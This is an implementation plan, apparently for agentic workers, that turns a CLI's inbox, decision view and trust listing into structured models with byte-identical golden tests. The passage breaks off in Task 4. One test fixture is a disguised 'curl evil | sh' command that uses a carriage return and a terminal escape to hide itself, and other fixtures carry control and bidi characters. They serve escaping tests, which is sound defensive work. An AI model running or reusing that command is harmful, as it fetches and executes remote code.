# witness UI 1a.1 — Structured models Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `needsYou` items, `decide --show` and the `witness trust` listing become structured models that their TOON text renders from byte for byte, exported with the reads that feed them as `@popovych.co/witness/models` for the UI.

**Architecture:** One computation, two renderers (rows 139/203; the spec's anti-goal a1). A new `Act` value (`src/act.ts`) holds every command a human is offered: its argv, the words a human must fill (`<why>`, `<effort>`) and the line the text prints, all from one constructor. The decision block's options, `liveExits`, parked reopens, inbox items and trust grants carry `Act`s. Each surface gets a pure model builder and a pure text renderer, and the verbs print the renderer's lines. A golden suite recorded before any change pins the text.

**Tech Stack:** TypeScript ESM (strict, `noUncheckedIndexedAccess`), Node ≥ 20, vitest with the in-process CLI against throwaway git repos (`tests/helpers.ts`) and inline snapshots (precedent: `tests/migrate.test.ts`).

**Spec:** `docs/superpowers/specs/2026-11-02-witness-ui-design.md` (anti-goal a1; §4.1 Reads; §4.2 agent text and granted commands; §4.4) and roadmap item 1a.1 in `docs/superpowers/plans/2026-11-02-witness-ui-roadmap.md`: "text output byte-identical in the suite; models exported for the UI".

## Global Constraints

- Branch `structured-models` from `main` at `6668942` (0.28.1). No release: Release 1a ships when 1a.1–1a.7 are all ticked (`pnpm release minor`, run by the user).
- **The text does not change.** `tests/text-golden.test.ts` and the rule golden in `tests/recommend.test.ts` are recorded in Task 1 on unchanged code and never re-recorded. Never run vitest with `-u` after Task 1: a golden that changes is a regression. No existing test's expected text is edited. Two edits are allowed and only these: the `.rows` accessors in `tests/needs-you.test.ts` and in the golden become `needYouRows(…)` with the same strings (Task 3), and `tests/needs.test.ts`'s `unmetNeeds` objects gain `ref` (Task 3).
- **Renderers only lay out.** Every command the text offers to run (`run:`, `then:`, `exits:`, a block's options, a grant) is an `Act` in the model. Renderers add only labels, separators and prose pointers (`· witness log <id>`, `help: witness next`, `gh pr merge <n>`).
- **A model carries the values the text prints, escaped where the text escapes:** finding anchors and claims through `logSafe`, trust commands, sources and doc ids through `visible`. A model never holds the raw bytes of a command with a character outside printable ASCII, and never an act for one.
- **Models are plain data.** A JSON round trip of each model equals it: no functions, class instances, `Map` or `Set`. The UI moves them over a worker thread and a WebSocket.
- One deliberate behaviour change, Task 2: an option is runnable unless one of its argv words is exactly `<why>` or `<effort>`. Today a note prefill that merely contains that text marks the option not runnable. This finishes `PLACEHOLDER`'s own rule, "the CLI's own placeholders, and only those". No suite fixture holds such an anchor.
- No DESIGN row (the roadmap: rows 139/203 already state the rule; row 228 records the export when 1b lands). Where a model or renderer is introduced, comments cite `// Rows 139/203.`
- No new dependency. `src/spawn.ts` stays the only `node:child_process` importer (row 201).
- Tests keep row 213's rule: await every CLI run, and no long synchronous stretch.
- Done means `pnpm typecheck` clean, `pnpm build` clean and a full `pnpm test` green (read `Tests N passed` and 0 `AssertionError`).

## Review Focus

1. **Control and bidi characters in a reviewer's anchor or claim** (`\x1b[2J`, U+202E). The decide view carries them spelled out, the same bytes the text prints. Task 4.
2. **A trust command with a single quote, beside one with an escape character.** The quoted command's act holds the raw command as one argv word, so it runs without a shell, and its line is today's `'…'\''…'` form. The unsafe one is escaped in every row and has no act anywhere. Tasks 3 and 5.
3. **A note prefill (a reviewer's anchor) holding `"`, ` | ` or the literal text `<why>`.** The option's act keeps it as one argv word, the option stays runnable, and its line is unchanged. Task 2.
4. **A live-folder aside with no line, no why and no commands.** Every kind still builds a whole model: a trust grant with no commands but its listing act, a brainstorm with no ask, a merge whose PR comes from frontmatter. Task 3.
5. **The entry loaded by package name in a fresh Node process, without the CLI's bin.** It resolves through `exports`, registers the gate specs `decideView` needs, and prints nothing. Task 6.

---

### Task 0: Branch, and commit the roadmap and this plan

- [ ] **Step 1:** `git switch -c structured-models` (from `main` at `6668942`).
- [ ] **Step 2:** In the roadmap, change 1a.1's Size from `M` to `L` (six tasks).
- [ ] **Step 3:** Commit the roadmap and this plan: `docs: the witness UI roadmap; plan for 1a.1 structured models`.

### Task 1: Pin today's text

**Files:**
- Create: `tests/model-fixtures.ts` (builders, not a test file), `tests/text-golden.test.ts`
- Modify: `tests/recommend.test.ts` (one new `describe` at the end, reusing the file's `run`, `decision`, `failedRun` and `ctxFor`), `tests/trust.test.ts` (its `planWithCmdCriterion` moves to the fixtures and is imported back)

**Interfaces:**
- Consumes, all at `6668942`: `needsYou` and `.rows` (`src/needs-you.ts`), `renderGateRun` (`src/gate.ts`), `recommend` and `renderDecision` (`src/recommend.ts`), `gateSpec` (`src/gate.ts`, after `import '../src/gates/index.js'`), `effortReviewedSha` (`src/reviewed.ts`), and the helpers `seededRepo`, `writeSpec`, `writePlan`, `approve`, `autonomyOn`, `fakeCtx`, `appendEntry`, `repo.setMeta`.
- Produces, in `tests/model-fixtures.ts`:
  - `needsYouRepo(): Promise<{ repo: TestRepo; asides: AsideFacts[] }>`
  - `type DecideState = 'no-runs' | 'reopened' | 'settled-arbiter' | 'implement-revised' | 'plan-trust-twin' | 'moved-after-revise' | 'bound-moved'`
  - `decideRepo(state: DecideState): Promise<{ repo: TestRepo; gate: GateName; target: string; shas: string[] }>`
  - `trustRepo(shipTest = 'pnpm test'): Promise<TestRepo>` (the body of `planWithCmdCriterion`, unchanged)
  - `norm(s: string, repo: TestRepo, shas: readonly string[]): string`: replaces `repo.root` with `<root>` and each sha's first 7 hex with `<sha>`
  - `cfgOf(root: string): Config`: `loadConfig`'s value, throwing when it refuses. `tests/needs-you.test.ts` keeps its own identical one.
  - `EVERY_LINE_RUN: GateRunEntry`: the gate-run entry described in Step 2's `a gate run renders every line`. Task 4's view test reuses it.

- [ ] **Step 1: Write the fixtures.**

  `needsYouRepo` yields at least one item of every kind, in both aside forms:
  - Spec `auth-refresh` (approved) with needs `[{ id: 'prod', manual: 'production access granted', satisfied: false, holds: ['ac-prod'] }, { manual: 'docs reviewed', satisfied: false }]` and criteria `[{ id: 'ac-rotate', test: '@spec:auth-refresh' }, { id: 'ac-prod', cmd: 'true' }]`.
  - Plan `auth-refresh-plan-1`: one stopped plan gate-run and no decision, so a decision is owed.
  - Plan `-plan-2`: a stopped run, then `stop` with `selected: 'policy'` and `note: 'drive cap: plan ran 16 rounds'`. This one is parked below the bound.
  - Plan `-plan-3`: stopped runs in rounds 1–3 with distinct shas, then a plain `stop`. This one is parked at the bound.
  - Plan `-plan-4` with `repo.setMeta('auth-refresh-plan-4', { pr: 9 })`.
  - Last, a crashed `witness ask crashed`, using the child from `tests/needs-you.test.ts` 'a pending transaction is first'. A transaction is now pending.

  Its asides:
  - `{ target: 'billing-page', kind: 'kept', stop: 'design-look' }`
  - `{ target: 'auth-refresh-plan-5', kind: 'kept', stop: 'trust-grant', trust: [{ cmd: "echo 'hi'", source: 'ship.test' }, { cmd: 'bad\u001bcmd', source: 'ship.lint' }] }`
  - `{ target: 'auth-refresh-plan-6', kind: 'kept', stop: 'trust-grant' }`
  - `{ target: 'auth-refresh-plan-7', kind: 'conversation' }`
  - `{ target: '-', kind: 'conversation', line: 'witness brainstorm --ask a-1' }`
  - `{ target: 'auth-refresh-plan-4', kind: 'merge' }`
  - `{ target: 'auth-refresh-plan-8', kind: 'merge', line: 'ship: merge PR #12 on GitHub when ready' }`
  - `{ target: 'x-plan-1', kind: 'stuck', why: 'no progress on witness ship x-plan-1' }`
  - `{ target: 'x-plan-2', kind: 'capped' }`
  - `{ target: '-', kind: 'stuck', why: 'spawn ceiling' }`

  `decideRepo` builds these states, each on `seededRepo()`:
  - `no-runs`: `autonomyOn`, spec `auth-refresh`, gate `decompose` on `repo.effort`.
  - `reopened`: the `reopenedAfterApprove` journal from `tests/decide-show.test.ts`. Shas: none.
  - `settled-arbiter`: a decompose run at the effort's current sha, then `approve` with `selected: 'arbiter'`, `reason: 'the slice covers g1'`, `arbiter: { model: 'test-model-1', prompts_sha: 'p' }`, `rule: 'reserved-stop-clean'`.
  - `implement-revised`:
    - Spec `auth-refresh`, approved, with the needs and criteria of `needsYouRepo`. Plan `auth-refresh-plan-1` with `steps: [{ id: 's1', title: 't', criteria: ['ac-rotate', 'ac-prod'] }]`.
    - An `implement` gate-run in round 1: `reviewed_sha: 'sha-impl'`, outcome `stopped`, `checks: [{ name: 'tests', ok: false, detail: 'ac-rotate:fail', held: [{ criterion: 'ac-prod', need: 'prod', satisfy: 'witness satisfy auth-refresh --need prod' }] }]` and `verdicts: [{ reviewer: 'code-reviewer', coverage: [{ anchor: 'src/token.ts', note: 'read' }], findings: [{ blocking: true, anchor: 'src/token.ts', claim: 'expiry\u001b[2J‮unbounded' }] }]`.
    - A `policy-pin` with `ordinal: 1` and `text: 'render the service in full'`.
    - A `human-decision` `revise` with `note: 'fix the expiry'`.
  - `plan-trust-twin`: spec `auth-refresh`, approved, with criteria `[{ id: 'ac-rotate', test: '@spec:auth-refresh' }, { id: 'ac-e2e', cmd: 'npm run e2e' }]`, and plan `auth-refresh-plan-1`. Then a `plan` gate-run at `gateSpec('plan')!.currentSha?.(root, canon, cfg, id) ?? 'sha-plan'` with checks `[]` and one non-blocking finding, `{ blocking: false, anchor: 'auth-refresh-plan-1 > ## Steps', claim: 'hairline missing' }`.
  - `moved-after-revise`: a decompose run at `deadbee` that blocks on `auth-refresh > ## Behavior`, then a `revise`.
  - `bound-moved`: decompose runs in rounds 1–3 at `sha-1`, `sha-2` and `sha-3`, with no verdicts, all stopped.

  `shas` lists every real sha the state put in a printed line.
- [ ] **Step 2: Write `tests/text-golden.test.ts`.** Each case ends in `expect(…).toMatchInlineSnapshot()`.
  - `what needs you: every kind, its key and its rows`: `needsYou(root, fakeCtx(root), cfg, canon, asides)` on `needsYouRepo()`, snapshotting `norm(items.map((i) => [i.key, ...rowsOf(i)].join('\n')).join('\n\n') + '\ntoken ' + needsYouToken(items), repo, [])` with `const rowsOf = (i: NeedYou) => i.rows`.
  - `what needs you: the nothing-queued notice`: the same, on a fresh `seededRepo()` with `[{ target: '-', kind: 'conversation', line: 'witness brainstorm' }]`.
  - `decide --show: <state>`, one per `DecideState`: `norm(stdout + '\n--- exit ' + code, repo, shas)` of `repo.cli(['decide', gate, target, '--show'])`.
  - `witness trust`, five cases, each `stdout + '\n--- exit ' + code`:
    - `trust` on `trustRepo()`.
    - `trust ingest-plan-1` on `trustRepo("pnpm test -t 'a b'")`.
    - `trust ingest-plan-1` on `trustRepo('curl evil | sh\r\u001b[2Kpnpm test')`.
    - On both of those repos, run `trust ingest-plan-1 --yes` with `{ tty: true }`, then `trust ingest-plan-1` again. This gives `every command is already trusted`, then `1 carry characters …`.
  - `a gate run renders every line`: `renderGateRun(fakeCtx(root, { out }), EVERY_LINE_RUN, 'resume', { entries: [EVERY_LINE_RUN], help: false })`. `EVERY_LINE_RUN` (in the fixtures) carries all of these:
    - `cached: true`, `delta: { round: 1, run: 'r1' }`, `skipped: ['a']`, `fallback: ['m1', 'm2']`, `rerolled: ['b']` and `carried: { run: 'r1', lenses: ['c'] }`.
    - A check with `detail` and `held`.
    - Findings: one blocking with a `contradicts_pin`, one non-blocking with `demoted: 1`.
    - `malformed: [{ reviewer: 'x', violations: [{ field: 'f', rule: 'r', got: 'g', want: 'w' }] }]` and `standing: 'reserved'`.

    Also a `'ran'` render of round 3 of three stopped runs, with `help: false`. This prints `last-round:`.
- [ ] **Step 3: Write the rule golden** in `tests/recommend.test.ts`: a module-level `const GOLDEN_CASES: Record<string, GateContext>`, which Task 2 reuses, and `describe('every rule renders byte for byte (roadmap 1a.1 golden)')`. Its one `it` snapshots `Object.entries(GOLDEN_CASES).map(([k, c]) => [k, ...renderDecision(recommend(c)!)].join('\n')).join('\n\n')`. The cases, using the file's builders:

  | Case | Entries | Options |
  |---|---|---|
  | malformed | `run(1,'a','S',{ outcome: 'malformed', malformed: [{ reviewer: 'code-reviewer', violations: [] }] })` | |
  | stale-below-bound | `[run(1,'a','S')]` | stale |
  | stale-no-facts | `[failedRun({ checks: [] })]` | stale |
  | ladder-spent | `[run(1,'a','S'), decision('revise-upstream', { anchor: 'S' }), run(2,'b','S')]` | |
  | bound-recurrence | `[run(1,'a','S'), run(2,'b','S'), run(3,'c','S')]` | |
  | bound-recurrence-no-upstream | the same | `upstream: undefined`, a literal context, since `ctxFor` defaults it |
  | bound | `[run(1,'a','S1'), run(2,'b','S2'), run(3,'c','S3')]` | |
  | bound-stale | the same | stale |
  | anchor-recurrence-2 | `[run(1,'a','S'), run(2,'b','S')]` | |
  | pin-contradiction | one run whose finding has `contradicts_pin: 1` | |
  | blocking-parent | `[run(1,'a','auth-refresh > ## Behavior')]` | |
  | blocking-here | `[run(1,'a','src/a.ts')]` | |
  | checks-failed-ack | a findings-free run with `checks: [{ name: 'amendment-ack', ok: false }]` | |
  | checks-failed | `[failedRun()]` | |
  | non-blocking-only | one run with a non-blocking finding | |
  | non-blocking-trust-twin | the same | `untrustedCmds: ['npm run e2e']` |
  | reserved-stop-clean | a findings-free run with `standing: 'reserved'` | |
  | manual-stop | a findings-free, standing-free run | |

  No anchor in any case contains the text `<why>` or `<effort>` (see the deliberate change in the Global Constraints).
- [ ] **Step 4:** Move `planWithCmdCriterion` into the fixtures as `trustRepo`, and import it back into `tests/trust.test.ts` under its old name.
- [ ] **Step 5:** Record the goldens on unchanged code with `pnpm vitest run tests/text-golden.test.ts tests/recommend.test.ts -u`. Read the recorded `decide --show: implement-revised` and `witness trust` snapshots against a manual `witness decide … --show` and `witness trust …` in the same fixture: they must be today's output. Then run `pnpm vitest run tests/text-golden.test.ts tests/recommend.test.ts tests/trust.test.ts` without `-u`. Expected: PASS.
- [ ] **Step 6:** Commit: `test: pin the inbox, decide --show and trust text before they become models`.

### Task 2: `Act`, with options, exits and reopens built from it

**Files:**
- Create: `src/act.ts`, `tests/act.test.ts`
- Modify:
  - `src/recommend.ts`: `opt` becomes the exported `option`, and `Option` gains `act`.
  - `src/verbs/recover.ts`: `recoverChoice`'s options go through `option`.
  - `src/rounds.ts`: `exitActs` and `reopenActs` are added, and `liveExits` and `reopenCommand` render them.
  - `src/verbs/next.ts`: `parkedGates()` returns `reopen: Act[]`.
  - `src/verbs/dashboard.ts`: its `parked` rows map `reopen` through `exitsLine`.
  - `src/needs-you.ts`: the parked row prints `exitsLine(p.reopen)` until Task 3.
- Test: `tests/act.test.ts`, `tests/recommend.test.ts`, `tests/exits-line.test.ts`

**Interfaces:**
- Produces, in `src/act.ts`:
  ```ts
  export type ActInputName = 'why' | 'effort'
  export interface ActInput { name: ActInputName; at: number }        // argv[at] is exactly `<name>`
  export interface Act { argv: readonly string[]; inputs: readonly ActInput[]; line: string }
  export function cliAct(...argv: string[]): Act
  export function exitsLine(acts: readonly Act[]): string
  ```
  - `argv` holds the words after `witness`, exactly as given.
  - `line` is `'witness '` plus each word, rendered three ways:
    - the word after `--note`: in double quotes, raw (D120's grammar);
    - an input: bare;
    - any other word: through `shellArg` (ids match `ID_RE`, so they print bare as today).
  - `exitsLine` joins the acts' lines with ` | `. When an act's first three words equal the previous act's and its first word is `decide`, it prints only the words after them. This is `liveExits`' grammar.
- Produces, in `src/recommend.ts`:
  - `Option` gains `act?: Act`. It is absent only on a choose block's options, which name a spec, not a command (`readyChoice`).
  - `export function option(act: Act, depth: Depth, rest: Partial<Pick<Option, 'why' | 'when' | 'tradeoff' | 'note' | 'judgeFirst'>> = {}): Option` returns `{ command: act.line, depth, runnable: act.inputs.length === 0, act, ...rest }`.
  - `PLACEHOLDER` stays exported, unchanged, for `arbiter.ts`.
- Produces, in `src/rounds.ts`:
  - `export function exitActs(gate: string, target: string, entries: Entry[], stale: boolean, upstream: string | undefined): Act[]`: the branches of today's `liveExits`, in its order.
  - `export function reopenActs(gate: string, target: string, entries: Entry[], upstream: string | undefined): Act[]`: at the bound, `exitActs(…, false, upstream)`; below it, `[cliAct('gate', gate, target, '--fresh')]`.
  - `liveExits(…)` becomes `exitsLine(exitActs(…))` and `reopenCommand(…)` becomes `exitsLine(reopenActs(…))`. Both signatures are unchanged.

- [ ] **Step 1: Write the failing tests** in `tests/act.test.ts`:
  ```ts
  describe('cliAct (rows 139/203)', () => {
    it('prints the line the CLI always printed', () => {
      expect(cliAct('decide', 'plan', 'p1', '--revise', '--note', '2 blocking findings: a "b", c').line)
        .toBe('witness decide plan p1 --revise --note "2 blocking findings: a "b", c"')
      expect(cliAct('decide', 'plan', 'p1', '--revise', '--upstream', '<effort>').line)
        .toBe('witness decide plan p1 --revise --upstream <effort>')
      expect(cliAct('trust', 'p1', '--cmd', "echo 'hi'").line).toBe(`witness trust p1 --cmd 'echo '\\''hi'\\'''`)
      expect(cliAct('gate', 'plan', 'p1', '--fresh').line).toBe('witness gate plan p1 --fresh')
    })
    it("names the words a human fills, by position, and only the CLI's own placeholders", () => {
      expect(cliAct('decide', 'plan', 'p1', '--revise', '--note', '<why>').inputs).toEqual([{ name: 'why', at: 5 }])
      expect(cliAct('decide', 'plan', 'p1', '--revise', '--upstream', '<effort>').inputs).toEqual([{ name: 'effort', at: 5 }])
      expect(cliAct('decide', 'plan', 'p1', '--revise', '--note', '1 blocking finding: <why> in <SaveBar>').inputs).toEqual([])
    })
    it('keeps every word as given, so it runs without a shell', () => {
      expect(cliAct('trust', 'p1', '--cmd', "echo 'hi' | wc").argv).toEqual(['trust', 'p1', '--cmd', "echo 'hi' | wc"])
    })
  })
  describe('exitsLine', () => {
    it("lets consecutive decide acts share the first one's prefix", () => {
      const d = (...rest: string[]) => cliAct('decide', 'plan', 'p1', ...rest)
      expect(exitsLine([cliAct('gate', 'plan', 'p1'), d('--revise', '--note', '<why>'), d('--stop')]))
        .toBe('witness gate plan p1 | witness decide plan p1 --revise --note "<why>" | --stop')
      expect(exitsLine([d('--approve', '--override'), d('--stop'), cliAct('abandon', 'p1')]))
        .toBe('witness decide plan p1 --approve --override | --stop | witness abandon p1')
    })
  })
  ```
  Then, in `tests/recommend.test.ts`, `describe('options carry their act (rows 139/203)')`:
  - Over `GOLDEN_CASES`: every option has `act`, `o.command === o.act.line`, and `o.runnable === (o.act.inputs.length === 0)`.
  - On `bound-recurrence-no-upstream`, option 1's act equals `{ argv: ['decide', 'plan', 'p1', '--revise', '--upstream', '<effort>'], inputs: [{ name: 'effort', at: 5 }], line: 'witness decide plan p1 --revise --upstream <effort>' }`, and it is not runnable.
  - Review Focus 3: run `recommend(ctxFor([run(1, 'a', 'src/a.ts "x" | <why>')]))`. The `--note` option's last argv word is `'1 blocking finding: src/a.ts "x" | <why>'`, it is runnable, and its `command` is `'witness decide plan p1 --revise --note "1 blocking finding: src/a.ts "x" | <why>"'`.
  - The trust twin's act is the plain approve's argv plus `--trust-cmds`.

  And in `tests/exits-line.test.ts`:
  - `liveExits(…) === exitsLine(exitActs(…))` for each of these states: below the bound, stale with a decision pending, stale without one, the bound, and the bound when stale.
  - `reopenActs` gives `[cliAct('gate', 'plan', 'p1', '--fresh')]` below the bound, and the bound's acts ending in `cliAct('abandon', 'p1')` at it.
- [ ] **Step 2:** Run `pnpm vitest run tests/act.test.ts tests/recommend.test.ts tests/exits-line.test.ts`. Expected: FAIL, because `../src/act.js` does not exist.
- [ ] **Step 3:** Implement `src/act.ts`, then build every option in `recommendCore` and `recoverChoice` with `option(cliAct(…), …)`:
  - Use `const d = (...rest: string[]) => cliAct('decide', gate, target, ...rest)`.
  - `up` becomes `d('--revise', '--upstream', upstream ?? '<effort>')` and `note` becomes `d('--revise', '--note', notePrefill(entries, gate))`.
  - The twin is `option(cliAct(...o.act.argv, '--trust-cmds'), …)`, offered where `o.act?.argv.at(-1) === '--approve'`.

  Then implement `exitActs` and `reopenActs`, and switch `parkedGates`, the dashboard and needs-you to them.
- [ ] **Step 4:** Run `pnpm vitest run tests/act.test.ts tests/recommend.test.ts tests/exits-line.test.ts tests/text-golden.test.ts tests/txn.test.ts tests/arbiter.test.ts tests/dashboard.test.ts tests/decide*.test.ts` and `pnpm typecheck`. Expected: PASS, goldens untouched.
- [ ] **Step 5:** Commit: `feat(act): a command is argv, its inputs and its line; options, exits and reopens carry one`.

### Task 3: What needs you is a model

**Files:**
- Modify:
  - `src/needs-you.ts`: the union, `needYouRows`, and the `ctx` parameter type.
  - `src/allowlist.ts`: `grantAct` and `UNGRANTABLE` are added, and `grantOf` is built from them.
  - `src/needs.ts`: `UnmetNeed.ref`.
  - `src/drive-report.ts`, `src/drive.ts` (the pause rows), `src/verbs/next.ts` (the `waiting:` line) and `src/verbs/wait.ts` (both `say` calls) all call `needYouRows`.
- Test: `tests/needs-you.test.ts`; `tests/needs.test.ts` (each `unmetNeeds` object gains `ref`); `tests/text-golden.test.ts` (`rowsOf` becomes `needYouRows`)

**Interfaces:**
- Consumes: `cliAct`, `exitsLine` and `Act` (Task 2); `parkedGates().reopen: Act[]` (Task 2); `recoverChoice` (its options carry acts).
- Produces, in `src/allowlist.ts`:
  - `export const UNGRANTABLE = 'never granted here — rewrite it in printable ASCII where it is written'`
  - `export function grantAct(target: string, c: Pick<RunCommand, 'cmd'>): Act | undefined`: undefined when `hasControl(c.cmd)`, else `cliAct('trust', target, '--cmd', c.cmd)`.
  - `grantOf` becomes `grantAct(…)?.line ?? UNGRANTABLE`, byte for byte today's.
- Produces, in `src/needs.ts`: `UnmetNeed` gains `ref: string`, the need as `--need` takes it: its id, else its 1-based index (`n.id ?? String(i + 1)`).
- Produces, in `src/needs-you.ts`:
  ```ts
  export interface TrustGrant { cmd: string; source: string; grant?: Act }   // cmd, source: visible(); no grant when unsafe
  interface ItemBase { target: string; key: string; notice?: true }
  export type NeedYou = ItemBase & (
    | { kind: 'pending-txn'; op: string; recover: Decision }
    | { kind: 'design-look'; open: Act; show: Act }
    | { kind: 'trust-grant'; commands?: TrustGrant[]; list: Act }          // no commands: read from the live folder
    | { kind: 'need'; need: string; text: string; holds: string[]; satisfy: Act }
    | { kind: 'decision'; gate: string; show: Act }
    | { kind: 'conversation'; ask?: string; handoff?: string }
    | { kind: 'merge'; pr?: string }
    | { kind: 'parked'; gate: string; round: number; why: string; reopen: Act[] }
    | { kind: 'stuck'; why?: string; retry?: Act }
    | { kind: 'capped'; why?: string; retry?: Act })                       // two members, so `Extract` narrows each
  export function needsYou(root: string, ctx: Pick<Ctx, 'env'>, cfg: Config, canon: Canon, aside: readonly AsideFacts[]): NeedYou[]
  export function needYouRows(item: NeedYou): string[]
  ```
  - The keys, the order, the `named` dedupe and the notice rule are today's.
  - `open` is `cliAct('design', t, '--open')` and `show` is `cliAct('decide', 'design', t, '--show')` for a look, `cliAct('decide', gate, t, '--show')` for a decision.
  - `list` is `cliAct('trust', t)`, `satisfy` is `cliAct('satisfy', u.doc, '--need', u.ref)` and `retry` is `cliAct('retry', t)`; a target-less item has no `retry`.
  - `why` (parked) is the policy's note, else `parked at <anchor>`.
  - `handoff` is `handoffLine(…)` when the driver resolves.
- `needYouRows`: today's rows, moved verbatim from `needsYou`. A field replaces each value, and every command comes from an act.

  | kind | rows |
  |---|---|
  | pending-txn | `wait: pending transaction · ${op}` · `  run: ${recover.options[0].command}` |
  | design-look | `wait: design look · ${target}` · `  run: ${open.line}` · `  then: ${show.line}` |
  | trust-grant | no commands: `wait: trust grant · ${target}` · `  run: ${list.line}`; else, per command: `wait: trust grant · ${target} · ${cmd} (${source})` · `  run: ${grant.line}`, or `  note: ${UNGRANTABLE}` |
  | need | `wait: unmet need · ${target} · ${text}`, or with holds, `wait: held criterion · ${target} · ${text} holds ${holds.join(' · ')}` · `  run: ${satisfy.line}` |
  | decision | `wait: decision · ${gate} ${target}` · `  run: ${show.line}` |
  | conversation | notice: `nothing queued — /witness <what to build> in a chat`; else `wait: conversation · ${target === '-' ? 'brainstorm' + (ask ? ' · ask ' + ask : '') : target}` · `  run: ${handoff}` when set |
  | merge | `wait: merge · ${target}` + ` · PR #${pr}` · `  run: gh pr merge ${pr}`, both only with a PR |
  | parked | `parked: ${target} · ${gate} round ${round} — ${why}` · `  run: ${exitsLine(reopen)}` |
  | stuck, capped | `stuck: ${target} — ${why ?? 'witness log ' + target}` · `  run: ${retry.line}` when set |

- [ ] **Step 1: Write the failing tests** in `tests/needs-you.test.ts`, on `needsYouRepo()`:
  ```ts
  it('each kind carries its facts and acts (rows 139/203)', async () => {
    const { repo, asides } = await needsYouRepo()
    const items = needsYou(repo.root, { env: {} }, cfgOf(repo.root), loadCanon(repo.root), asides)
    const of = <K extends NeedYou['kind']>(k: K, target?: string) =>
      items.find((i) => i.kind === k && (target === undefined || i.target === target)) as Extract<NeedYou, { kind: K }>
    expect(of('pending-txn').recover.options.map((o) => o.act?.argv))
      .toEqual([['recover', '--complete'], ['recover', '--rollback']])
    expect(of('need', 'auth-refresh')).toMatchObject({ need: 'prod', text: 'production access granted', holds: ['ac-prod'],
      satisfy: cliAct('satisfy', 'auth-refresh', '--need', 'prod') })
    expect(items.find((i) => i.kind === 'need' && i.need === 'docs reviewed'))
      .toMatchObject({ satisfy: cliAct('satisfy', 'auth-refresh', '--need', '2') })
    expect(of('decision')).toMatchObject({ target: 'auth-refresh-plan-1', gate: 'plan',
      show: cliAct('decide', 'plan', 'auth-refresh-plan-1', '--show') })
    expect(of('parked', 'auth-refresh-plan-2').reopen).toEqual([cliAct('gate', 'plan', 'auth-refresh-plan-2', '--fresh')])
    expect(of('parked', 'auth-refresh-plan-3').reopen.at(-1)).toEqual(cliAct('abandon', 'auth-refresh-plan-3'))
    expect(of('stuck', 'x-plan-1')).toMatchObject({ why: 'no progress on witness ship x-plan-1', retry: cliAct('retry', 'x-plan-1') })
    expect(of('stuck', '-').retry).toBeUndefined()
    expect(JSON.parse(JSON.stringify(items))).toEqual(items)
  })
  it('a trust grant carries each command escaped, a grant only where the verb would take one (Review Focus 2)', async () => {
    const { repo, asides } = await needsYouRepo()
    const items = needsYou(repo.root, { env: {} }, cfgOf(repo.root), loadCanon(repo.root), asides)
    const grant = items.find((i) => i.kind === 'trust-grant' && i.target === 'auth-refresh-plan-5')
    expect(grant).toMatchObject({ commands: [
      { cmd: "echo 'hi'", source: 'ship.test', grant: cliAct('trust', 'auth-refresh-plan-5', '--cmd', "echo 'hi'") },
      { cmd: 'bad\\x1bcmd', source: 'ship.lint' },
    ] })
    expect(grant?.kind === 'trust-grant' && grant.commands?.[1]?.grant).toBeFalsy()
    expect(JSON.stringify(items)).not.toContain('\u001b')
  })
  it('an aside read from the live folder still builds a whole model (Review Focus 4)', async () => {
    const { repo } = await needsYouRepo()
    const items = needsYou(repo.root, { env: {} }, cfgOf(repo.root), loadCanon(repo.root), [
      { target: 'auth-refresh-plan-6', kind: 'kept', stop: 'trust-grant' },
      { target: '-', kind: 'conversation' },
      { target: 'auth-refresh-plan-4', kind: 'merge' },
    ])
    expect(items.find((i) => i.kind === 'trust-grant'))
      .toEqual({ kind: 'trust-grant', target: 'auth-refresh-plan-6', key: 'trust-grant:auth-refresh-plan-6', list: cliAct('trust', 'auth-refresh-plan-6') })
    const talk = items.find((i) => i.kind === 'conversation') as Extract<NeedYou, { kind: 'conversation' }>
    expect(talk).toMatchObject({ target: '-', key: 'conversation:-' })
    expect(talk.ask).toBeUndefined()
    expect(talk.notice).toBeUndefined()
    expect(items.find((i) => i.kind === 'merge')).toMatchObject({ target: 'auth-refresh-plan-4', pr: '9' })
  })
  ```
  Also update the file's existing `.rows` reads to `needYouRows(i)`, with the same expected strings. In the token test, `b` becomes `{ kind: 'decision', target: 'b', key: 'decision:b:plan', gate: 'plan', show: cliAct('decide', 'plan', 'b', '--show') }`, and `{ ...b, gate: 'implement' }` is the "same key, other facts" twin.
- [ ] **Step 2:** Run `pnpm vitest run tests/needs-you.test.ts`. Expected: FAIL (no `recover`, `satisfy` or `needYouRows`).
- [ ] **Step 3:** Implement the model, the renderer, `grantAct`, `UNGRANTABLE` and `ref`, then switch the four consumers to `needYouRows`. `wait.ts`'s PR poll keeps reading frontmatter.
- [ ] **Step 4:** Swap `rowsOf` in `tests/text-golden.test.ts` to `needYouRows`. Add `ref` to `tests/needs.test.ts`'s three objects (`'prod'`, `'2'`, `'1'`). Then run `pnpm vitest run tests/needs*.test.ts tests/text-golden.test.ts tests/drive-report.test.ts tests/drive-pause.test.ts tests/wait.test.ts tests/next-wait.test.ts tests/gate-park.test.ts tests/trust-preflight.test.ts` and `pnpm typecheck`. Expected: PASS.
- [ ] **Step 5:** Commit: `feat(needs-you): items are models with their acts; the rows render from them`.

### Task 4: `decide --show` is a model

**Files:**
- Create: `src/gate-run-view.ts`, `src/decide-view.ts`, `tests/decide-view.test.ts`
- Modify:
  - `src/gate.ts`: `renderGateRun` composes the view, and `findingRows` and `malformedRows` move out.
  - `src/verbs/review.ts`: it imports those two from `../gate-run-view.js`.
  - `src/verbs/decide.ts`: `show()` prints the view's lines.

**Interfaces:**
- Consumes: `exitActs`, `Option.act` and `exitsLine` (Task 2). Existing types: `ReviewerVerdict`, `GateRunEntry` and `DecisionEntry` (`src/rounds.ts`), `PolicyPin` and `Entry` (`src/journal.ts`), `HeldRow` (`src/needs.ts`) and `GateName` (`src/settings.ts`).
- Produces, in `src/gate-run-view.ts`:
  ```ts
  export interface FindingView { reviewer: string; blocking: boolean; pin?: number; anchor: string; claim: string } // anchor, claim: logSafe
  export function findingViews(verdicts: ReviewerVerdict[]): FindingView[]
  export function findingRows(verdicts: ReviewerVerdict[]): Array<Record<string, string>>     // over findingViews, today's shape
  export function malformedRows(malformed: NonNullable<GateRunEntry['malformed']>): Array<Record<string, string>> // moved as is
  export interface GateRunView {
    gate: string; target: string; round: number; budget: number; resume: boolean
    reviewed: string; model: string; cached: boolean                       // reviewed: the sha's first 7
    delta?: number; skipped: string[]; fallback: string[]; rerolled: string[]
